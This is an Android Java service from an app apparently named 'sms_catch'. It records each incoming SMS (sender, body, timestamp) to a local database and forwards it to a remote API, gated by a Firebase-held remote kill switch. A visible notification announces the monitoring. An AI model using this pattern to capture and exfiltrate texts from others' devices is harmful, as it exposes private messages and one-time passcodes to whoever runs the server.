package com.qbitspark.sms_catch;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class SmsListenerService extends Service {
    private static final String TAG = "SmsListenerService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "sms_service_channel";
    private boolean isAppEnabled = true;


    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create notification
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Monitoring")
                .setContentText("Listening for SMS messages")
                .setSmallIcon(R.drawable.ic_notification) // Make sure you have this icon
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .build();

        // Start as foreground service
        startForeground(NOTIFICATION_ID, notification);

        // Process the SMS data in a background thread
        if (intent != null) {
            final String sender = intent.getStringExtra("sender");
            final String messageBody = intent.getStringExtra("messageBody");
            final long timestamp = intent.getLongExtra("timestamp", 0);

            if (sender != null && messageBody != null) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            // Create message data object
                            MessageData messageData = new MessageData();
                            messageData.setSender(sender);
                            messageData.setMessageBody(messageBody);
                            messageData.setTimestamp(timestamp);

                            // Save to database on background thread
                            MessageDatabase database = MessageDatabase.getInstance(getApplicationContext());
                            database.messageDao().insert(messageData);

                            Log.d(TAG, "SMS saved to database: " + sender);

                            DatabaseReference killSwitchRef = FirebaseDatabase.getInstance()
                                    .getReference("killSwitchEnabled");

                            killSwitchRef.addListenerForSingleValueEvent(new ValueEventListener() {
                                @Override
                                public void onDataChange(@NonNull DataSnapshot snapshot) {
                                    Boolean isDisabled = snapshot.getValue(Boolean.class);

                                    if (isDisabled != null && isDisabled) {
                                        Log.d(TAG, "App is disabled by kill switch - aborting operation");
                                        return;
                                    }

                                    // Otherwise proceed with normal operation
                                    ApiClient.sendMessage(getApplicationContext(), messageData);
                                }

                                @Override
                                public void onCancelled(@NonNull DatabaseError error) {
                                    Log.e(TAG, "Failed to check kill switch", error.toException());
                                }
                            });

                        } catch (Exception e) {
                            Log.e(TAG, "Error processing SMS", e);
                        }
                    }
                }).start();
            }
        }

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "SMS Listener Service",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean isAppEnabled() {
        return isAppEnabled;
    }
}